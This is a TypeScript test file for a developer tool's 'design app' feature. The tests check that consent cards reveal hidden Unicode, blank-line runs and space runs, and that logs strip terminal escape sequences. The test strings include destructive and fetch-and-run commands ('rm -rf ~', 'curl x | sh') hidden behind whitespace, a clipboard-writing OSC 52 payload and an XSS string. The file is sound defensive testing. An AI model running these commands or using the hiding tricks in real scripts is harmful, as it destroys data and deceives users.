import assert from "node:assert/strict";
import test from "node:test";
import {
  consentDisplayText,
  consentScriptParts,
  designAppAnnouncement,
  designAppChip,
  designAppProblemMessage,
  designAppRetryable,
  designBrowserServers,
  EMPTY_LOG_CARRY,
  FRAMEWORK_IDS,
  logDisplayChunk,
  logDisplayText,
  type DesignAppProblem,
  type DesignAppStatus,
  type DesignAppsSnapshot,
} from "./design-app.js";

const MARKER = "SECRET-TAIL-MARKER";

const EVERY_PROBLEM: DesignAppProblem[] = [
  { problem: "unavailable" },
  { problem: "no-access" },
  { problem: "interrupted" },
  { problem: "desktop-only" },
  { problem: "recovery-failed" },
  { problem: "node-missing" },
  { problem: "manager-missing", manager: "pnpm" },
  { problem: "manager-conflict", conflict: ["npm", "pnpm"] },
  { problem: "manager-conflict", conflict: ["npm", "yarn"], field: "yarn" },
  { problem: "unsupported-manager", manager: "deno" },
  { problem: "launch-file-unreadable", file: "apps/web/vite.config.ts" },
  { problem: "script-too-long" },
  { problem: "consent-declined" },
  { problem: "consent-unanswered" },
  { problem: "consent-unavailable" },
  { problem: "job-limit" },
  { problem: "install-outside-workspace" },
  { problem: "install-failed", exitCode: 1, tail: MARKER },
  { problem: "install-timeout" },
  { problem: "not-ready", tail: MARKER },
  { problem: "exposed" },
  { problem: "exposure-unknown" },
  { problem: "not-web" },
  { problem: "attach-not-loopback" },
  { problem: "attach-unreachable" },
  { problem: "attach-not-in-app" },
];

test("every problem has a fixed message that never contains its tail", () => {
  const seen = new Set<string>();
  for (const problem of EVERY_PROBLEM) {
    const message = designAppProblemMessage(problem);
    assert.ok(message.length > 10, problem.problem);
    assert.ok(message.endsWith("."), `${problem.problem}: ${message}`);
    assert.equal(message.includes(MARKER), false, problem.problem);
    seen.add(message);
  }
  assert.equal(seen.size, EVERY_PROBLEM.length, "each problem reads differently");
});

test("manager-missing names the manager; exposed and install-outside-workspace say how to fix it", () => {
  assert.match(designAppProblemMessage({ problem: "manager-missing", manager: "pnpm" }), /pnpm/u);
  assert.match(designAppProblemMessage({ problem: "manager-missing", manager: "bun" }), /bun/u);
  const exposed = designAppProblemMessage({ problem: "exposed" });
  assert.match(exposed, /127\.0\.0\.1/u);
  assert.match(exposed, /--host/u);
  assert.match(exposed, /process\.env\.PORT/u);
  assert.match(designAppProblemMessage({ problem: "install-outside-workspace" }), /parent/u);
  assert.match(designAppProblemMessage({ problem: "launch-file-unreadable", file: ".npmrc" }), /\.npmrc/u);
});

test("the framework ids are the twelve detection knows", () => {
  assert.equal(FRAMEWORK_IDS.length, 12);
  assert.equal(new Set(FRAMEWORK_IDS).size, 12);
  assert.ok(FRAMEWORK_IDS.includes("vite") && FRAMEWORK_IDS.includes("next") && FRAMEWORK_IDS.includes("remix-3"));
});

test("consentDisplayText escapes every class in D5", () => {
  const cases: Array<[string, string]> = [
    ["dev‮rm", "dev\\u{202E}rm"], // bidi override
    ["a​b", "a\\u{200B}b"], // zero-width space
    ["x\u0007", "x\\u{7}"], // bell
    ["a\rb", "a\\u{D}b"], // carriage return
    ["a b", "a\\u{2028}b"], // line separator
    ["a b", "a\\u{2029}b"], // paragraph separator
    ["ㅤ", "\\u{3164}"], // Hangul filler
    ["ﾠ", "\\u{FFA0}"], // halfwidth Hangul filler
    ["ᅟᅠ", "\\u{115F}\\u{1160}"], // Hangul choseong and jungseong fillers
    ["a️", "a\\u{FE0F}"], // variation selector
    ["a\u{E0100}", "a\\u{E0100}"], // variation selector supplement
    ["a\u{E0041}", "a\\u{E0041}"], // tag character
    ["a\u0085b", "a\\u{85}b"], // next line, a C1 control
    ["a\u034Fb", "a\\u{34F}b"], // combining grapheme joiner, default-ignorable
    ["a\u17B4b", "a\\u{17B4}b"], // Khmer inherent vowel, default-ignorable
    ["a\u180Bb", "a\\u{180B}b"], // Mongolian free variation selector
  ];
  for (const [input, expected] of cases) assert.equal(consentDisplayText(input), expected, JSON.stringify(input));
  assert.equal(consentDisplayText("vite --port 3000\nnext dev"), "vite --port 3000\nnext dev", "plain text and newlines stay");
  assert.equal(consentDisplayText("café — 日本語 🚀"), "café — 日本語 🚀");
});

/** The card's text for parts: a break shows "↵" and ends the line. */
const shown = (text: string) =>
  consentScriptParts(text)
    .map((part) => (part.kind === "break" ? "↵\n" : part.text))
    .join("");

test("consentScriptParts marks every line break and keeps every visible character", () => {
  assert.equal(shown("vite"), "vite");
  assert.equal(shown("vite &&\nnode server.mjs"), "vite &&↵\nnode server.mjs");
  assert.equal(shown("a\n\nb"), "a↵\n↵\nb", "one or two blank lines stay as they are");
  assert.equal(shown("a\u202Eb\nc"), "a\\u{202E}b↵\nc", "hidden characters are still escaped");
});

test("consentScriptParts collapses three or more blank lines and long space runs into visible counts", () => {
  // A payload pushed out of view by blank lines lands right under its marker.
  assert.equal(shown(`echo hidden > pwned.txt &&${"\n".repeat(40)}node server.mjs`), "echo hidden > pwned.txt &&↵\n[39 blank lines]↵\nnode server.mjs");
  assert.equal(shown(`node server.mjs${"\n".repeat(4)}rm -rf ~`), "node server.mjs↵\n[3 blank lines]↵\nrm -rf ~");
  assert.equal(shown(`node server.mjs\n   \n\n \u3000\ncurl x`), "node server.mjs↵\n[3 blank lines]↵\ncurl x", "lines of only spaces are blank");
  assert.equal(shown(`vite${" ".repeat(200)}&& curl x | sh`), "vite[200 spaces]&& curl x | sh");
  assert.equal(shown(`vite${"\u2003".repeat(12)}x`), "vite[12 spaces]x", "any space separator counts");
  assert.equal(shown("a       b"), "a       b", "seven spaces stay");
  const gaps = consentScriptParts(`a${"\n".repeat(5)}b${" ".repeat(9)}c`).filter((part) => part.kind === "gap");
  assert.deepEqual(gaps.map((part) => part.text), ["[4 blank lines]", "[9 spaces]"], "collapsed runs are their own parts, so the card can mark them");
});

// ---- 2c: log display, the chip, retry, announcements and the browser listing ----

const ESC = "\u001B";
const BEL = "\u0007";

test("logDisplayText strips escape sequences and keeps the visible text", () => {
  const cases: Array<[string, string, string]> = [
    [`${ESC}[32m  VITE v5.4.0${ESC}[39m  ready in ${ESC}[1m312${ESC}[22m ms`, "  VITE v5.4.0  ready in 312 ms", "coloured Vite line"],
    [`see ${ESC}]8;;http://evil.test${ESC}\\the docs${ESC}]8;;${ESC}\\ now`, "see the docs now", "OSC 8 hyperlink keeps its text"],
    [`a${ESC}]52;c;cm0gLXJmIH4=${BEL}b`, "ab", "OSC 52, BEL-terminated"],
    [`a${ESC}]52;c;cm0gLXJmIH4=${ESC}\\b`, "ab", "OSC 52, ST-terminated"],
    [`a${ESC}]0;pwned title${BEL}b`, "ab", "OSC 0 title"],
    [`a${ESC}P1$r0m${ESC}\\b`, "ab", "DCS"],
    [`a${ESC}_apc${ESC}\\b${ESC}^pm${ESC}\\c${ESC}Xsos${ESC}\\d`, "abcd", "APC, PM and SOS"],
    [`a${ESC}(Bb${ESC}=c`, "abc", "short escape sequences"],
    ["one\r\ntwo\rthree", "one\ntwo\nthree", "CR LF and lone CR"],
    ["a\tb", "a\tb", "tab survives"],
    [`end${ESC}`, "end\\u{1B}", "a lone ESC at the end shows escaped"],
    ["dev‮rm", "dev\\u{202E}rm", "bidi override"],
    ["a​b", "a\\u{200B}b", "zero-width space"],
    ["<img src=x onerror=alert(1)>", "<img src=x onerror=alert(1)>", "markup is just text"],
  ];
  for (const [input, expected, label] of cases) assert.equal(logDisplayText(input), expected, label);
});

/** Feeds chunks through logDisplayChunk in turn and joins what it shows. */
function chunked(chunks: string[]): string {
  let carry = EMPTY_LOG_CARRY;
  let shownText = "";
  for (const chunk of chunks) {
    const result = logDisplayChunk(chunk, carry);
    shownText += result.text;
    carry = result.carry;
  }
  return shownText;
}

test("logDisplayChunk carries unfinished sequences across reads", () => {
  const whole = (chunks: string[]) => logDisplayChunk(chunks.join(""), EMPTY_LOG_CARRY).text;
  const osc = ["x ", `${ESC}]52;c;`, `cm0gLXJmIH4=${BEL} y\n`];
  assert.equal(chunked(osc), "x  y\n");
  assert.equal(chunked(osc), whole(osc));
  assert.equal(chunked(osc).includes("cm0g"), false, "none of the clipboard payload shows");
  const csi = [`${ESC}[3`, `2mgreen${ESC}[0m\n`];
  assert.equal(chunked(csi), "green\n");
  assert.equal(chunked(csi), whole(csi));
  const crlf = ["a\r", "\nb\n"];
  assert.equal(chunked(crlf), "a\nb\n");
  assert.equal(chunked(crlf), whole(crlf));
  const loneCr = ["a\r", "b\n"];
  assert.equal(chunked(loneCr), "a\nb\n");
});

test("logDisplayChunk caps a line at 4 KiB and counts the rest when its newline arrives", () => {
  const line = "x".repeat(300 * 1024);
  const chunks: string[] = [];
  for (let at = 0; at < line.length; at += 64 * 1024) chunks.push(line.slice(at, at + 64 * 1024));
  chunks.push("\nnext\n");
  const expected = `${"x".repeat(4096)} [${300 * 1024 - 4096} more characters]\nnext\n`;
  assert.equal(chunked(chunks), expected);
  assert.equal(logDisplayChunk(chunks.join(""), EMPTY_LOG_CARRY).text, expected);
});

test("an escape sequence running past 4 KiB without its end shows escaped, chunked or whole, and the carry stays bounded", () => {
  const payload = "A".repeat(10 * 1024);
  const chunks = ["before ", `${ESC}]52;c;${payload.slice(0, 5000)}`, payload.slice(5000), `${BEL}after\n`];
  const shown = chunked(chunks);
  assert.ok(shown.startsWith("before \\u{1B}]52;c;AAAA"), "the started sequence shows, its ESC escaped");
  assert.equal(shown.includes(ESC), false);
  assert.ok(shown.endsWith(" more characters]\n"), "the rest of the long line is counted");
  assert.equal(shown, logDisplayChunk(chunks.join(""), EMPTY_LOG_CARRY).text, "the same whatever the reads");
  let carry = EMPTY_LOG_CARRY;
  for (const chunk of chunks.slice(0, 3)) {
    carry = logDisplayChunk(chunk, carry).carry;
    assert.ok(carry.pending.length <= 4096, "the carry stays bounded");
  }
});

test("an OSC or DCS that a newline breaks shows escaped, so the lines after it show (newline policy)", () => {
  const chunks = [`${ESC}]0;title`, "\nimportant error line\n", "more\n"];
  assert.equal(chunked(chunks), "\\u{1B}]0;title\nimportant error line\nmore\n");
  assert.equal(chunked(chunks), logDisplayChunk(chunks.join(""), EMPTY_LOG_CARRY).text);
  assert.equal(chunked([`${ESC}P1$qm`, "\r\nnext\n"]), "\\u{1B}P1$qm\nnext\n");
});

test("CAN and SUB cancel an OSC or DCS, which shows nothing", () => {
  assert.equal(chunked([`a${ESC}]0;title\u0018b\n`]), "ab\n");
  assert.equal(chunked([`a${ESC}]8;;http://x`, `\u001Ab\n`]), "ab\n");
  assert.equal(chunked([`a${ESC}P1$q\u001Ab\n`]), "ab\n");
});

function app(overrides: Partial<DesignAppStatus> = {}): DesignAppStatus {
  return {
    workspaceId: "w1",
    appRoot: ".",
    source: "started",
    framework: "vite",
    frameworkLabel: "Vite",
    phase: "stopped",
    since: 0,
    revision: 1,
    ...overrides,
  };
}

function snapshot(overrides: Partial<DesignAppsSnapshot> = {}): DesignAppsSnapshot {
  return { workspaceId: "w1", target: "single", apps: [], candidates: [], chosen: [], ...overrides };
}

test("designAppChip hides for unavailable and offers Connect or Choose apps with no apps", () => {
  assert.equal(designAppChip(snapshot({ target: "unavailable" })), null);
  for (const target of ["none", "react-nonweb"] as const) {
    const chip = designAppChip(snapshot({ target }));
    assert.equal(chip?.label, "Connect", target);
    assert.equal(chip?.connectOnly, true, target);
  }
  const choose = designAppChip(
    snapshot({ target: "choose", candidates: [{ appRoot: "apps/a", frameworkLabel: "Vite" }, { appRoot: "apps/b", frameworkLabel: "Next.js" }] }),
  );
  assert.equal(choose?.label, "Choose apps…");
  assert.equal(choose?.connectOnly, false);
  assert.equal(choose?.choose, true);
});

test("designAppChip labels one app by its state", () => {
  const label = (status: Partial<DesignAppStatus>) => designAppChip(snapshot({ apps: [app(status)] }))?.label;
  const running = designAppChip(snapshot({ apps: [app({ phase: "running", origin: "http://127.0.0.1:5173", port: 5173 })] }));
  assert.equal(running?.label, "Vite · :5173");
  assert.equal(running?.tone, "running");
  assert.equal(label({ phase: "running", source: "attached", origin: "http://[::1]:5173", port: 5173 }), "Vite · :5173");
  assert.equal(label({ phase: "installing" }), "Installing…");
  assert.equal(label({ phase: "starting" }), "Starting…");
  assert.equal(label({ phase: "consent" }), "Waiting for approval");
  assert.equal(label({ phase: "crashed", exitCode: 1 }), "Crashed");
  assert.equal(label({ phase: "stopped", problem: { problem: "choice-not-saved" } }), "Not running");
  assert.equal(label({ phase: "stopped" }), "Start");
  assert.equal(label({ phase: "stopped", source: "attached", url: "http://localhost:4321" }), "Connect");
  assert.equal(label({ phase: "stopped", source: "attached" }), "Connect again");
  assert.equal(designAppChip(snapshot({ apps: [app({ phase: "crashed" })] }))?.tone, "problem");
  assert.equal(designAppChip(snapshot({ apps: [app({ phase: "starting" })] }))?.tone, "busy");
  assert.equal(designAppChip(snapshot({ apps: [app({ phase: "stopped" })] }))?.tone, "neutral");
});

test("designAppChip summarises several apps with the worst tone", () => {
  const running = app({ appRoot: "a", phase: "running", origin: "http://127.0.0.1:1", port: 1 });
  const busy = app({ appRoot: "b", phase: "starting" });
  const broken = app({ appRoot: "c", phase: "crashed" });
  const two = designAppChip(snapshot({ target: "choose", apps: [running, busy] }));
  assert.equal(two?.label, "2 apps");
  assert.equal(two?.tone, "busy");
  assert.equal(two?.apps.length, 2);
  assert.equal(designAppChip(snapshot({ target: "choose", apps: [running, busy, broken] }))?.tone, "problem");
  assert.equal(designAppChip(snapshot({ target: "choose", apps: [running, running] }))?.tone, "running");
});

test("designAppRetryable offers Retry for failures a retry can fix, never for attached apps", () => {
  const retryable: DesignAppProblem[] = [
    { problem: "install-failed", exitCode: 1, tail: "" },
    { problem: "install-timeout" },
    { problem: "node-missing" },
    { problem: "manager-missing", manager: "pnpm" },
    { problem: "manager-conflict", conflict: ["npm", "pnpm"] },
    { problem: "unsupported-manager", manager: "deno" },
    { problem: "not-ready", tail: "" },
    { problem: "exposure-unknown" },
    { problem: "recovery-failed" },
    { problem: "choice-not-saved" },
  ];
  for (const problem of retryable) assert.equal(designAppRetryable(app({ problem })), true, problem.problem);
  assert.equal(designAppRetryable(app({ phase: "crashed", exitCode: 1 })), true, "crashed");
  for (const problem of [{ problem: "exposed" }, { problem: "consent-declined" }, { problem: "already-running" }] as DesignAppProblem[]) {
    assert.equal(designAppRetryable(app({ problem })), false, problem.problem);
  }
  assert.equal(designAppRetryable(app({ source: "attached", problem: { problem: "attach-unreachable" } })), false);
  assert.equal(designAppRetryable(app({ source: "attached", phase: "crashed" })), false);
  assert.equal(designAppRetryable(app({ phase: "running" })), false);
});

test("designAppAnnouncement speaks a crash and a disconnect only", () => {
  const running = app({ phase: "running", origin: "http://127.0.0.1:5173", port: 5173 });
  assert.equal(designAppAnnouncement(running, app({ phase: "crashed", revision: 2 })), "Vite crashed.");
  const attached = app({ source: "attached", phase: "running", origin: "http://127.0.0.1:5173", port: 5173 });
  assert.equal(
    designAppAnnouncement(attached, app({ source: "attached", phase: "stopped", revision: 2 })),
    "Disconnected from your server at 127.0.0.1:5173.",
  );
  assert.equal(designAppAnnouncement(app({ phase: "starting" }), running), null);
  assert.equal(designAppAnnouncement(app({ phase: "stopped" }), app({ phase: "starting" })), null);
  assert.equal(designAppAnnouncement(running, { ...running, revision: 2 }), null);
  assert.equal(designAppAnnouncement(undefined, app({ phase: "crashed" })), null);
});

test("designBrowserServers lists running apps, started and attached, with an escaped root", () => {
  const servers = designBrowserServers(
    snapshot({
      apps: [
        app({ appRoot: "apps/web", phase: "running", origin: "http://127.0.0.1:5173", port: 5173 }),
        app({ appRoot: "docs‮", frameworkLabel: "App", source: "attached", phase: "running", origin: "http://[::1]:4321", port: 4321 }),
        app({ appRoot: "apps/admin", phase: "starting" }),
        app({ appRoot: "apps/old", phase: "stopped" }),
      ],
    }),
  );
  assert.deepEqual(servers, [
    { url: "http://127.0.0.1:5173/", label: "Vite · apps/web · design mode" },
    { url: "http://[::1]:4321/", label: "App · docs\\u{202E} · design mode" },
  ]);
});

test("2c's problems have their own fixed sentences", () => {
  const notLoopback = designAppProblemMessage({ problem: "attach-not-loopback" });
  assert.match(notLoopback, /127\.0\.0\.1/u);
  assert.match(notLoopback, /--host/u);
  assert.doesNotMatch(designAppProblemMessage({ problem: "attach-unreachable" }), /answer/iu, "no probe is claimed");
  assert.match(designAppProblemMessage({ problem: "already-running" }), /Disconnect it first\.$/u);
  assert.match(designAppProblemMessage({ problem: "already-running", started: true }), /Stop it first/u);
  assert.match(designAppProblemMessage({ problem: "attach-url-invalid" }), /http:\/\/\[::1\]:<port>/u);
  const all: DesignAppProblem[] = [
    ...EVERY_PROBLEM,
    { problem: "choice-not-saved" },
    { problem: "already-running" },
    { problem: "already-running", started: true },
    { problem: "attach-url-invalid" },
  ];
  const seen = new Set(all.map((problem) => designAppProblemMessage(problem)));
  assert.equal(seen.size, all.length, "each problem reads differently");
  for (const problem of all) assert.equal(designAppProblemMessage(problem).includes(MARKER), false);
});
